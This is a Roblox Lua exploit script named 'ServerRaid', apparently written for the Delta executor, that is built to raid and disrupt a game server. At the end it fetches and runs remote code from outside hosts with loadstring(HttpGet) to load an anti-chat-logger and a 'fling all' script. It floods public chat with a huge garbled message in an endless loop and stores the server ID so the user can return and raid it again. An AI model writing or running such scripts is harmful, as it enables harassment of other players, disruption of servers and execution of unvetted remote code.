local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local fileName = "ServerRaid.txt"

local function writeToFile(fileName, content)
    local success, _ = pcall(function()
        writefile("/storage/emulated/0/Delta/Workspace/" .. fileName, content)
    end)
    return success
end

local function readFromFile(fileName)
    local success, content = pcall(function()
        return readfile("/storage/emulated/0/Delta/Workspace/" .. fileName)
    end)
    return success and content or nil
end

local function Rejoin()
    if not readFromFile(fileName) then
        writeToFile(fileName, "0")
    end
    local storedServerId = readFromFile(fileName)
    if storedServerId and storedServerId ~= "0" and storedServerId ~= game.JobId then
        createGUI()
    end
end

local function createGUI()
    local ScreenGui = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local QuestionLabel = Instance.new("TextLabel")
    local YesButton = Instance.new("TextButton")
    local NoButton = Instance.new("TextButton")

    ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
    Frame.Size = UDim2.new(0, 400, 0, 200)
    Frame.Position = UDim2.new(0.5, -200, 0.5, -100)
    Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Frame.Parent = ScreenGui

    QuestionLabel.Size = UDim2.new(1, 0, 0.5, 0)
    QuestionLabel.Text = "Do you want to teleport to the previous server?"
    QuestionLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    QuestionLabel.Parent = Frame

    YesButton.Size = UDim2.new(0.4, 0, 0.25, 0)
    YesButton.Position = UDim2.new(0.1, 0, 0.6, 0)
    YesButton.Text = "Yes"
    YesButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    YesButton.Parent = Frame

    NoButton.Size = UDim2.new(0.4, 0, 0.25, 0)
    NoButton.Position = UDim2.new(0.5, 0, 0.6, 0)
    NoButton.Text = "No"
    NoButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    NoButton.Parent = Frame

    YesButton.MouseButton1Click:Connect(function()
        local storedServerId = readFromFile(fileName)
        if storedServerId and storedServerId ~= "0" then
            local success, _ = pcall(function()
                TeleportService:TeleportToPlaceInstance(game.PlaceId, storedServerId, Players.LocalPlayer)
            end)
            QuestionLabel.Text = success and "Teleporting..." or "Failed to teleport."
        else
            QuestionLabel.Text = "No valid Server ID."
        end
    end)

    NoButton.MouseButton1Click:Connect(function()
        writeToFile(fileName, tostring(game.JobId))
        ScreenGui:Destroy()
    end)
end

local function spamChat()
    local message = "ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿SERVERRAID"
    while true do
        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
        wait(2)
    end
end

local function flingAll()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FLING-ALL-SCRIPT-17590"))()
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua", true))()

Rejoin()
spawn(spamChat)
spawn(flingAll)